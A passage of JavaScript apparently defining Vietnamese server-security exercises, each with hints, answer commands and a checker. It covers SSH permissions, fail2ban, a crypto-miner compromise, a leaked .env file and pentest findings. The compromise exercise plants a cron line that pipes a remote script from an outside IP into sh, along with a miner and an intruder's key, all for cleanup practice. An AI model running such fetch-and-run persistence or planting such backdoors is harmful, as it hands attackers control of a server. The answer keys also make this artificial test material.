    symptom: L('$ ssh haidangphan@116.118.9.210   (từ laptop, khoá đúng, đã cài)', 'haidangphan@116.118.9.210: Permission denied (publickey).', '', '$ sudo grep refused /var/log/auth.log | tail -2', 'Oct 26 17:40:11 vps sshd[4012]: Authentication refused: bad ownership or modes for directory /home/haidangphan/.ssh'),
    story: 'Hôm qua bạn dùng `sudo nano` sửa `authorized_keys` và `chmod` thư mục cho "tiện". Từ đó SSH bằng khoá thất bại, dù khoá không đổi. Bạn đang vào bằng console của nhà cung cấp.',
    goal: '`~/.ssh` có quyền 700 và `authorized_keys` có quyền 600, cả hai thuộc đúng user haidangphan.',
    hints: ['Xem quyền và chủ sở hữu: `ls -la ~/.ssh`. Cột 3 là chủ, cột 1 là quyền.', 'Hai lỗi chồng nhau: thư mục `.ssh` quá rộng (775) và file `authorized_keys` thuộc `root` (do dùng sudo nano).', '`sudo chown haidangphan:haidangphan ~/.ssh/authorized_keys`, `chmod 700 ~/.ssh`, `chmod 600 ~/.ssh/authorized_keys`.'],
    fix: ['ls -la ~/.ssh', 'sudo chown haidangphan:haidangphan ~/.ssh/authorized_keys', 'chmod 700 ~/.ssh', 'chmod 600 ~/.ssh/authorized_keys', 'ls -la ~/.ssh'],
    cause: 'sshd bật StrictModes: từ chối khoá khi thư mục hoặc file cho nhóm/người khác ghi hoặc thuộc user khác. Cách tránh: sửa file của mình bằng user của mình (không `sudo nano`), và nhớ bộ ba 700 cho thư mục, 600 cho file, đúng chủ.',
    setup: function (s) {
      C.secBase(s, { sshMode: '775', akMode: '644' });
      s.fs.get(s.home + '/.ssh/authorized_keys').owner = 'root';
      s.fs.put('/var/log/auth.log', txt(s, '/var/log/auth.log') + 'Oct 26 17:40:11 vps sshd[4012]: Authentication refused: bad ownership or modes for directory /home/haidangphan/.ssh\n', { owner: 'root', mode: M('640') });
    },
    check: function (s) { var d = s.fs.get(s.home + '/.ssh'), f = s.fs.get(s.home + '/.ssh/authorized_keys'); return !!d && !!f && (d.mode & 511) === M('700') && (f.mode & 511) === M('600') && d.owner === s.user && f.owner === s.user; }
  },
  {
    id: 'c2d5', title: 'Tự bị fail2ban chặn khỏi chính VPS của mình',
    host: 'vps', user: 'haidangphan',
    symptom: L('$ ssh haidangphan@116.118.9.210   (từ nhà, mạng 203.0.113.7)', 'ssh: connect to host 116.118.9.210 port 22: Connection timed out', '', '$ sudo fail2ban-client status sshd   (qua 4G)', 'Banned IP list:   203.0.113.7 45.155.205.12'),
    story: 'Tối qua bạn gõ nhầm mật khẩu vài lần khi thử script, fail2ban chặn luôn IP nhà bạn (203.0.113.7). Bạn đã vào lại được bằng mạng 4G. IP 45.155.205.12 là kẻ dò mật khẩu thật, phải GIỮ nguyên chặn.',
    goal: 'IP nhà (203.0.113.7) hết bị chặn VÀ không bao giờ bị chặn lại (nằm trong ignoreip đã nạp); IP kẻ tấn công vẫn bị chặn.',
    hints: ['Xem danh sách chặn: `sudo fail2ban-client status sshd`. Gỡ riêng IP của bạn bằng `set sshd unbanip`, đừng dùng `unban --all`.', 'Gỡ chặn chưa đủ: lần sau sai mật khẩu bạn lại bị chặn. Cần `ignoreip` trong `/etc/fail2ban/jail.local`.', 'Tạo jail.local có `[DEFAULT]` và `ignoreip = 127.0.0.1/8 203.0.113.7`, rồi `sudo fail2ban-client reload` và kiểm tra `get sshd ignoreip`.'],
    fix: ['sudo fail2ban-client status sshd', 'sudo fail2ban-client set sshd unbanip 203.0.113.7', 'echo -e "[DEFAULT]\\nignoreip = 127.0.0.1/8 203.0.113.7" | sudo tee /etc/fail2ban/jail.local', 'sudo fail2ban-client reload', 'sudo fail2ban-client get sshd ignoreip'],
    cause: 'fail2ban không phân biệt bạn với kẻ xấu: sai mật khẩu đủ số lần là bị chặn. `unbanip` chỉ giải quyết hậu quả; `ignoreip` trong jail.local mới là phòng ngừa. Tắt đăng nhập mật khẩu cũng giảm hẳn nguy cơ này.',
    setup: function (s) {
      C.secBase(s);
      s.W.f2b.banned = [OWN, BAD];
    },
    check: function (s) { var c = s.W.f2b.cfg; return !banned(s, OWN) && banned(s, BAD) && !!c && c.ignoreip.indexOf(OWN) >= 0 && /ignoreip\s*=.*203\.0\.113\.7/.test(txt(s, '/etc/fail2ban/jail.local')); }
  },
  {
    id: 'c2d6', title: 'VPS ngốn CPU 100%: dấu hiệu bị xâm nhập',
    host: 'vps', user: 'haidangphan',
    symptom: L('$ ps aux | head -3', 'USER       PID %CPU COMMAND', 'haidangphan 3317 96.8 ./.cache/xmrig -o pool.minexmr.com:4444', '', '$ last -n 3', 'haidangphan pts/1  185.220.101.4   Sun Oct 25 03:11   still logged in', 'haidangphan pts/0  203.0.113.7     Mon Oct 26 09:12   still logged in'),
    story: 'Nhà cung cấp cảnh báo CPU 100% suốt đêm. `last` có một lần đăng nhập từ IP lạ lúc 03:11 bằng... mật khẩu. Hãy dọn dẹp theo thứ tự: tiến trình, cron, khoá lạ, và đóng đường vào (mật khẩu). Cron hợp lệ `30 2 * * * backup.sh` và khoá `duong@laptop` phải giữ nguyên.',
    goal: 'Hết tiến trình khai thác, cron chỉ còn dòng hợp lệ, không còn khoá lạ, và sshd đã reload với `passwordauthentication no`.',
    hints: ['Xem tiến trình: `ps aux | grep xmrig`; xem cron: `crontab -l`; xem khoá: `cat ~/.ssh/authorized_keys`.', 'Dừng tiến trình: `kill 3317`. Gỡ riêng dòng cron xấu: `crontab -l | grep -v x.sh | crontab -`. Gỡ khoá: `sed -i \'/unknown@kali/d\' ~/.ssh/authorized_keys`.', 'Đóng đường vào: `sudo sed -i \'s/^PasswordAuthentication yes/PasswordAuthentication no/\' /etc/ssh/sshd_config`, `sudo sshd -t`, `sudo systemctl reload ssh`.'],
    fix: ['last -n 3', 'ps aux | grep xmrig', 'kill 3317', "crontab -l | grep -v x.sh | crontab -", "sed -i '/unknown@kali/d' ~/.ssh/authorized_keys", "sudo sed -i 's/^PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config", 'sudo sshd -t', 'sudo systemctl reload ssh'],
    cause: 'Kẻ tấn công dò được mật khẩu (đăng nhập bằng password), cài trình đào coin, cron để tự sống lại và khoá riêng để quay lại. Chỉ kill tiến trình là vô ích: cron sẽ chạy lại, khoá lạ vẫn mở cửa. Phải gỡ cả ba và đóng đường vào gốc (tắt mật khẩu). Với root bị chiếm, cân nhắc cài lại VPS.',
    setup: function (s) {
      C.secBase(s, { cloudInit: false });
      var W = S(s);
      W.procs = [{ pid: 3317, user: s.user, cmd: './.cache/xmrig -o pool.minexmr.com:4444' }];
      W.cron.haidangphan = ['*/5 * * * * curl -s http://45.9.148.7/x.sh | sh', '30 2 * * * /home/haidangphan/backup.sh'];
      W.lastRows = ['haidangphan pts/1        185.220.101.4    Sun Oct 25 03:11   still logged in', 'haidangphan pts/0        203.0.113.7      Mon Oct 26 09:12   still logged in', 'reboot   system boot  6.8.0-45-generic Mon Oct 19 06:00   still running'];
      s.fs.put(s.home + '/.ssh/authorized_keys', 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5K1main duong@laptop\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5KZZ9 unknown@kali\n', { owner: s.user, mode: M('600') });
      s.fs.put('/var/log/auth.log', txt(s, '/var/log/auth.log') + 'Oct 25 03:11:09 vps sshd[2988]: Accepted password for haidangphan from 185.220.101.4 port 40112 ssh2\n', { owner: 'root', mode: M('640') });
    },
    check: function (s) {
      var W = S(s), cr = W.cron.haidangphan || [];
      return W.procs.length === 0 && cr.length > 0 && !cr.some(function (l) { return /curl|x\.sh/.test(l); }) && cr.some(function (l) { return /backup\.sh/.test(l); }) &&
        !/unknown@kali/.test(txt(s, s.home + '/.ssh/authorized_keys')) && /duong@laptop/.test(txt(s, s.home + '/.ssh/authorized_keys')) && app(s).passwordauthentication === 'no';
    }
  },
  {
    id: 'c2d7', title: 'Bot tải được file .env từ website',
    host: 'vps', user: 'haidangphan',
    symptom: L('$ sudo grep "/.env" /var/log/nginx/access.log', '45.155.205.12 - - [26/Oct/2026:03:11:09 +0700] "GET /.env HTTP/1.1" 200 96', '', '$ ls -l /var/www/html/.env', '-rw-r--r-- 1 haidangphan haidangphan 96 Oct 20 /var/www/html/.env'),
    story: 'Bạn lỡ `cp .env /var/www/html/` khi thử deploy, và Nginx đang phục vụ thư mục đó. Log cho thấy bot đã tải file với mã 200. File chứa `JWT_SECRET` và mật khẩu. File thật cho ứng dụng nằm ở ~/tutor/ui/.',
    goal: 'File không còn nằm trong thư mục web; bản ở `~/tutor/ui/.env` có quyền 600; `JWT_SECRET` đã được ĐỔI sang giá trị mới.',
    hints: ['Xác nhận mức độ: `sudo grep "/.env" /var/log/nginx/access.log` và `cat` file để biết cái gì đã lộ.', 'Thứ tự đúng: coi bí mật đã lộ. Di chuyển file ra khỏi thư mục web (cần sudo vì thư mục thuộc root), `chmod 600`, rồi đổi giá trị bí mật.', '`sudo mv /var/www/html/.env ~/tutor/ui/.env`, `chmod 600 ~/tutor/ui/.env`, `sed -i \'s/^JWT_SECRET=.*/JWT_SECRET=Xk93mQ7vTn20bLw4/\' ~/tutor/ui/.env`.'],
    fix: ['sudo grep "/.env" /var/log/nginx/access.log', 'cat /var/www/html/.env', 'sudo mv /var/www/html/.env ~/tutor/ui/.env', 'chmod 600 ~/tutor/ui/.env', "sed -i 's/^JWT_SECRET=.*/JWT_SECRET=Xk93mQ7vTn20bLw4/' ~/tutor/ui/.env"],
    cause: 'Xoá file không thu hồi được bí mật đã bị tải về: phải xoay. Với JWT_SECRET, đổi giá trị làm mọi token cũ mất hiệu lực. Nếu mật khẩu DB cũng lộ thì đổi trong Postgres (`ALTER USER`) và `docker.env`. Phòng ngừa: Nginx chỉ phục vụ thư mục build công khai và `.env` luôn quyền 600 ngoài thư mục web.',
    setup: function (s) {
      C.secBase(s);
      s.fs.mkdirp('/var/www/html', 'root', M('755'));
      s.fs.mkdirp(s.home + '/tutor/ui', s.user);
      s.fs.put('/var/www/html/index.html', '<h1>tutor</h1>\n', { owner: 'root' });
      s.fs.put('/var/www/html/.env', 'NODE_ENV=production\nJWT_SECRET=supersecret123\nDB_PASSWORD=Ab12cd34ef56\n', { owner: s.user, mode: M('644') });
      var a = txt(s, '/var/log/nginx/access.log');
      s.fs.put('/var/log/nginx/access.log', a + '45.155.205.12 - - [26/Oct/2026:03:11:09 +0700] "GET /.env HTTP/1.1" 200 96 "-" "curl/8.5.0"\n', { owner: 'root', mode: M('640') });
    },
    check: function (s) { var t = txt(s, s.home + '/tutor/ui/.env'); return !s.fs.ex('/var/www/html/.env') && t.length > 0 && mode(s, s.home + '/tutor/ui/.env') === M('600') && /^JWT_SECRET=./m.test(t) && !/supersecret123/.test(t); }
  },
  {
    id: 'c2d8', hard: true, title: 'Sự cố tổng hợp: báo cáo pentest lần hai vẫn đỏ (không gợi ý sẵn)',
    host: 'vps', user: 'haidangphan',
    symptom: L('Báo cáo kiểm thử xâm nhập (lần 2):', '[ĐỎ] SSH: đăng nhập được bằng root', '[ĐỎ] SSH: chấp nhận xác thực bằng mật khẩu', '[ĐỎ] 116.118.9.210:6379 (Redis) mở ra Internet, không mật khẩu'),
    story: 'Sau báo cáo lần 1 bạn đã sửa `PasswordAuthentication no`, và chạy `ufw deny 6379`. Lần 2 vẫn đỏ cả ba mục. Hãy chẩn đoán đúng, đừng đoán mò: nguồn sự thật là `sshd -T` và `ss -tlnp`. Container Redis tên `cache` phải vẫn chạy sau khi sửa.',
    goal: 'sshd ĐANG CHẠY với `permitrootlogin no` và `passwordauthentication no`; không còn cổng 6379 nghe ở 0.0.0.0; container `cache` vẫn chạy.',
    hints: ['Đừng tin file bạn vừa sửa. Hãy hỏi chính sshd: `sudo sshd -T | grep -E "permitrootlogin|passwordauthentication"`. Rồi `sudo ss -tlnp | grep 6379`.', 'Hai nguyên nhân khác nhau: (a) có file trong `sshd_config.d` thắng file chính, và `PermitRootLogin` còn yes; (b) Docker publish cổng bỏ qua ufw.', 'Sửa cả file chính lẫn file trong sshd_config.d, `sshd -t`, reload; với Redis phải tạo lại container publish dạng `127.0.0.1:6379:6379`.'],
    fix: ['sudo sshd -T | grep -E "permitrootlogin|passwordauthentication"', "sudo sed -i 's/^PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config", "sudo sed -i 's/^PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config.d/50-cloud-init.conf", 'sudo sshd -t', 'sudo systemctl reload ssh', 'sudo ss -tlnp | grep 6379', 'docker rm -f cache', 'docker run -d --name cache -p 127.0.0.1:6379:6379 redis:7'],
    cause: 'Ba lớp lỗi: (1) `PermitRootLogin` vẫn yes trong file chính; (2) file `sshd_config.d/50-cloud-init.conf` do nhà cung cấp để lại có `PasswordAuthentication yes` và nằm trước nên thắng dòng bạn sửa; (3) Redis publish `0.0.0.0:6379` qua Docker nên `ufw deny` vô hiệu. Quy trình đúng: luôn xác nhận bằng `sshd -T` và quét/`ss` từ góc nhìn thực tế, không tin chỉ vào file hay bảng luật.',
    setup: function (s) {
      C.secBase(s);
      var n = s.fs.get('/etc/ssh/sshd_config');
      n.c = n.c.replace('PermitRootLogin no', 'PermitRootLogin yes').replace('PasswordAuthentication yes', 'PasswordAuthentication no');
      V.sec.snapshot(s);
      s.silent('docker pull redis:7');
      s.silent('docker run -d --name cache -p 6379:6379 redis:7');
      s.W.ufw.rules.push({ to: '6379', action: 'DENY', from: 'Anywhere' });
    },
    check: function (s) {
      var a = app(s), up = s.W.containers.some(function (c) { return c.name === 'cache' && c.state === 'running'; });
      return a.permitrootlogin === 'no' && a.passwordauthentication === 'no' && up && !s.listeners().some(function (l) { return l.port === 6379 && l.bind === '0.0.0.0'; });
    }
  }
];
})(typeof globalThis !== 'undefined' ? globalThis : this);
export {};
